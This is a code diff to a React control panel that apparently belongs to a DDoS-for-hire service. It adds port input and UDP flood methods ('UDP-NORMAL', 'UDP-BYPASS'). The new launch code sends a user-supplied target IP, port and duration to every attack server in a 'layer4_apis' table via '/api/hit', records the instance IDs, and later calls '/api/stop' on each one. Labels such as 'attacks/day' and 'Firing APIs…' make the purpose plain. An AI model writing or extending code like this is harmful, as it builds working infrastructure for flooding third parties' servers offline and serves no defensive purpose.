@@ -33,9 +33,11 @@ export default function Panel() {
   const [layer,       setLayer]       = useState(defaultLayer);
   const [method,      setMethod]      = useState(defaultMethod);
   const [target,      setTarget]      = useState("");
+  const [port,        setPort]        = useState("");
   const [duration,    setDuration]    = useState(null);
   const [launching,   setLaunching]   = useState(false);
   const [launchError, setLaunchError] = useState("");
+  const [launchInfo,  setLaunchInfo]  = useState("");
   const [runs,        setRuns]        = useState([]);
   const [todayCount,  setTodayCount]  = useState(0);
 
@@ -61,6 +63,8 @@ export default function Panel() {
     const methods = l === "L4" ? l4Methods : l7Methods;
     setMethod(methods[0] || null);
     setTarget("");
+    setPort("");
+    setLaunchInfo("");
   };
 
   useEffect(() => {
@@ -114,35 +118,96 @@ export default function Panel() {
 
   const dailyLimitReached = maxDailyRuns > 0 && todayCount >= maxDailyRuns;
   const noPlan = !plan;
+  // UDP-NORMAL (method 1) needs a port; UDP-BYPASS (method 2) does not
+  const needsPort = layer === "L4" && method === "UDP-NORMAL";
 
   async function launch(e) {
     e.preventDefault();
     if (!target.trim() || !method || !layer || !duration) return;
+    if (needsPort && !port.trim()) return;
     if (dailyLimitReached) {
       setLaunchError(`Daily limit reached (${maxDailyRuns} attacks/day). Resets at midnight.`);
       return;
     }
     setLaunchError("");
+    setLaunchInfo("");
     setLaunching(true);
+
+    // ── Fire real API calls for L4 UDP methods ──────────────────────────
+    let apiInstances = {};
+    if (layer === "L4" && (method === "UDP-NORMAL" || method === "UDP-BYPASS")) {
+      const { data: apis } = await supabase.from("layer4_apis").select("url");
+
+      if (apis && apis.length > 0) {
+        const body =
+          method === "UDP-NORMAL"
+            ? { method: 1, ip: target.trim(), port: parseInt(port, 10), duration }
+            : { method: 2, ip: target.trim(), time: duration };
+
+        const results = await Promise.allSettled(
+          apis.map((api) =>
+            fetch(`${api.url}/api/hit`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(body),
+            })
+              .then((r) => r.json())
+              .then((data) => ({ url: api.url, instance_id: data.instance_id }))
+          )
+        );
+
+        results.forEach((r) => {
+          if (r.status === "fulfilled" && r.value?.instance_id) {
+            apiInstances[r.value.url] = r.value.instance_id;
+          }
+        });
+
+        const hit   = Object.keys(apiInstances).length;
+        const total = apis.length;
+        setLaunchInfo(`${hit}/${total} API${total !== 1 ? "s" : ""} responded`);
+      }
+    }
+
+    // ── Save run record ─────────────────────────────────────────────────
     const table = layer === "L4" ? "l4_runs" : "l7_runs";
+    const hasApiHit = Object.keys(apiInstances).length > 0;
     const { error } = await supabase.from(table).insert({
-      user_id:  user.id,
-      target:   target.trim(),
+      user_id:       user.id,
+      target:        target.trim(),
       method,
       duration,
-      status:   "queued",
+      status:        hasApiHit ? "running" : "queued",
+      started_at:    hasApiHit ? new Date().toISOString() : null,
+      api_instances: hasApiHit ? apiInstances : null,
     });
+
     setLaunching(false);
     if (error) {
-      setLaunchError("Failed to launch: " + error.message);
+      setLaunchError("Failed to save run: " + error.message);
     } else {
       setTarget("");
+      setPort("");
       fetchRuns();
       fetchTodayCount();
     }
   }
 
   async function stopRun(id, _table) {
+    // Fetch stored instance IDs so we can stop each API server precisely
+    const { data: run } = await supabase
+      .from(_table)
+      .select("api_instances")
+      .eq("id", id)
+      .single();
+
+    if (run?.api_instances) {
+      await Promise.allSettled(
+        Object.entries(run.api_instances).map(([url, instanceId]) =>
+          fetch(`${url}/api/stop/${instanceId}`, { method: "POST" })
+        )
+      );
+    }
+
     await supabase
       .from(_table)
       .update({ status: "success", stopped_at: new Date().toISOString() })
@@ -226,7 +291,7 @@ export default function Panel() {
                   )}
 
                   {/* Target */}
-                  <Field label={layer === "L4" ? "Server IP" : "Target URL"}>
+                  <Field label={layer === "L4" ? "Target IP" : "Target URL"}>
                     <input
                       required
                       type="text"
@@ -236,6 +301,22 @@ export default function Panel() {
                       className="w-full rounded-lg border border-white/[0.08] bg-black/40 px-3 py-2.5 font-mono text-sm outline-none ring-1 ring-transparent transition focus:border-white/20 focus:ring-white/10"
                     />
                   </Field>
+
+                  {/* Port — only for UDP-NORMAL (method 1) */}
+                  {needsPort && (
+                    <Field label="Port (0 – 65535)">
+                      <input
+                        required
+                        type="number"
+                        min={0}
+                        max={65535}
+                        value={port}
+                        onChange={(e) => setPort(e.target.value)}
+                        placeholder="80"
+                        className="w-full rounded-lg border border-white/[0.08] bg-black/40 px-3 py-2.5 font-mono text-sm outline-none ring-1 ring-transparent transition focus:border-white/20 focus:ring-white/10"
+                      />
+                    </Field>
+                  )}
 
                   {/* Method */}
                   <Field label="Method">
@@ -290,13 +371,17 @@ export default function Panel() {
                     <p className="text-xs text-red-400">{launchError}</p>
                   )}
 
+                  {launchInfo && !launchError && (
+                    <p className="text-xs text-zinc-400">{launchInfo}</p>
+                  )}
+
                   <button
                     type="submit"
                     disabled={launching || dailyLimitReached || !method}
                     className="flex w-full items-center justify-center gap-2 rounded-full bg-white px-6 py-2.5 text-sm font-medium text-black ring-1 ring-white/10 transition-colors hover:bg-zinc-200 disabled:opacity-50"
                   >
                     <Play className="h-4 w-4" />
-                    {launching ? "Queuing…" : "Launch run"}
+                    {launching ? "Firing APIs…" : "Launch run"}
                   </button>
                 </form>
               )}
